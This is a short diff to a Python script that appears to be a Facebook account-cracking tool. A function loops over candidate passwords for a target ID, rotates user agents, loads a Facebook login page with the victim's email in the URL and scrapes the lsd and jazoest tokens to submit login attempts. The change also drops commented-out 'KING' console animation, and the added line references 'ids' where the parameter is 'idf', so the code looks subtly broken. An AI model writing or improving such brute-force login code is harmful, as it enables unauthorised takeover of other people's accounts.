@@ -1209,11 +1209,9 @@ def m6(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
-            #sys.stdout.flush()
+   referer_url = f'https://www.facebook.com/login/web/?email={ids}&is_from_lara=1'
    pro = random.choice(ugen)
-   free_fb = session.get('https://m.facebook.com').text
+   free_fb = session.get(referer_url).text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
